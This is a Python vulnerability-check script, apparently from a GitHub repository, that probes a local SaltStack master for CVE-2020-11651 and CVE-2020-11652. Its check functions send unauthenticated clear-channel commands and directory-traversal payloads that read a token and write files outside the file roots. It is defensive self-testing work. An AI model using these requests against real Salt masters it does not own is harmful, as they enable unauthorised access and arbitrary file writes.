# FROM https://github.com/rossengeorgiev/salt-security-backports/blob/master/salt-cve-check.py
#
#

from __future__ import absolute_import, print_function, unicode_literals
import os
import sys

import salt
import salt.version
import salt.transport.client
import salt.exceptions

# --- settings ---
DEBUG = False

master_ip = '127.0.0.1'
master_port = '4506'

minion_config = {

    'transport': 'zeromq',
    'pki_dir': '/tmp',
    'id': 'root',
    'log_level': 'debug',
    'master_ip': master_ip,
    'master_port': master_port,
    'auth_timeout': 5,
    'auth_tries': 1,
    'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port)
}

with salt.utils.fopen('/var/cache/salt/master/.root_key') as keyfd:
  root_key = keyfd.read()

top_secret_file_path = '/tmp/salt_cve_teta'

with salt.utils.fopen(top_secret_file_path, 'w') as fd:
  fd.write("top secret")

clear_channel = salt.transport.client.ReqChannel.factory(
    minion_config, crypt='clear')

# --- check funcs ----

def check_salt_version():
  print("[+] Salt version: {}".format(salt.version.__version__))

  vi = salt.version.__version_info__

  if (vi < (2019, 2, 4)
     or (3000,) <= vi < (3000, 2)):
     print("[ ] This version of salt is vulnerable! Check results below")

def check_connection():
  print("[+] Checking salt-master ({}:{}) status... ".format(master_ip, master_port), end='')
  sys.stdout.flush()

  # connection check
  try:
    clear_channel.send({'cmd':'ping'}, timeout=2)
  except salt.exceptions.SaltReqTimeoutError:
    print("OFFLINE")
    sys.exit(1)
  else:
    print("ONLINE")

def check_CVE_2020_11651():
  print("[+] Checking if vulnerable to CVE-2020-11651... ", end='')
  sys.stdout.flush()
  # try to evil
  try:
    rets = clear_channel.send({'cmd': '_do_evil_things'}, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("YES")
  except:
    print("ERROR")
    raise
  else:
    if rets:
        print("Maybe?")
        print(rets)
    else:
        print("NO")

def check_CVE_2020_11652_read_token():
  print("[+] Checking if vulnerable to CVE-2020-11652 (read_token)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'cmd': 'get_token',
    'arg': [],
    'token': top_secret_file_path,
  }

  try:
    rets = clear_channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("YES")
  except:
    print("ERROR")
    raise
  else:
    if DEBUG:
      print()
      print(rets)
    print("NO")

def check_CVE_2020_11652_read():
  print("[+] Checking if vulnerable to CVE-2020-11652 (read)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'file_roots.read',
    'path': top_secret_file_path,
    'saltenv': 'base',
  }

  try:
    rets = clear_channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if DEBUG:
      print()
      print(rets)
    if rets['data']['return']:
      print("YES")
    else:
      print("NO")

def check_CVE_2020_11652_write1():
  print("[+] Checking if vulnerable to CVE-2020-11652 (write1)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'file_roots.write',
    'path': '../../../../../../../../tmp/salt_CVE_2020_11652',
    'data': 'evil',
    'saltenv': 'base',
  }

  try:
    rets = clear_channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if DEBUG:
      print()
      print(rets)

    if rets['data']['return'].startswith('Wrote'):
      try:
        os.remove('/tmp/salt_CVE_2020_11652')
      except OSError:
        print("Maybe?")
      else:
        print("YES")
    else:
      print("NO")

def check_CVE_2020_11652_write2():
  print("[+] Checking if vulnerable to CVE-2020-11652 (write2)... ", end='')
  sys.stdout.flush()

  # try read file
  msg = {
    'key': root_key,
    'cmd': 'wheel',
    'fun': 'config.update_config',
    'file_name': '../../../../../../../../tmp/salt_CVE_2020_11652',
    'yaml_contents': 'evil',
    'saltenv': 'base',
  }

  try:
    rets = clear_channel.send(msg, timeout=3)
  except salt.exceptions.SaltReqTimeoutError:
    print("TIMEOUT")
  except:
    print("ERROR")
    raise
  else:
    if DEBUG:
      print()
      print(rets)

    if rets['data']['return'].startswith('Wrote'):
      try:
        os.remove('/tmp/salt_CVE_2020_11652.conf')
      except OSError:
	print("Maybe?")
      else:
	print("YES")
    else:
      print("NO")

# --- run checks ---

check_salt_version()
check_connection()
check_CVE_2020_11651()
check_CVE_2020_11652_read_token()
check_CVE_2020_11652_read()
check_CVE_2020_11652_write1()
check_CVE_2020_11652_write2()

# --- clean up ---

os.remove(top_secret_file_path)
